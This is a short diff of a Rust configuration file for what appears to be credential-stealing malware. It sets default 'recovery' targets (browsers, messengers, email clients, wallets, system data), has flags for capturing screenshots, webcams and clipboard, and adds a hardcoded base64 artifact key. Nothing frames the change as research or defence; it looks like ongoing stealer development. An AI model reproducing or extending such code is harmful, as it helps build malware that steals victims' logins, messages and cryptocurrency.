@@ -4,17 +4,8 @@ use once_cell::sync::Lazy;
 use std::{collections::HashSet, env, str::FromStr};
 use tracing::{info, warn};
 
-static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[
-    RecoveryCategory::Browsers,
-    RecoveryCategory::Messengers,
-    RecoveryCategory::Gaming,
-    RecoveryCategory::EmailClients,
-    RecoveryCategory::VPNs,
-    RecoveryCategory::Wallets,
-    RecoveryCategory::System,
-    RecoveryCategory::Other,
-]);
-static DEFAULT_ARTIFACT_KEY: Option<&str> = None;
+static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[RecoveryCategory::Browsers, RecoveryCategory::Messengers, RecoveryCategory::EmailClients, RecoveryCategory::Wallets, RecoveryCategory::System, RecoveryCategory::Other]);
+static DEFAULT_ARTIFACT_KEY: Option<&str> = Some("CSAUKAXurU5lMsYkMn8kbjLfdDHtmQam8zNKJA7R6oQ=");
 static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
 static DEFAULT_CAPTURE_WEBCAMS: bool = false;
 static DEFAULT_CAPTURE_CLIPBOARD: bool = false;
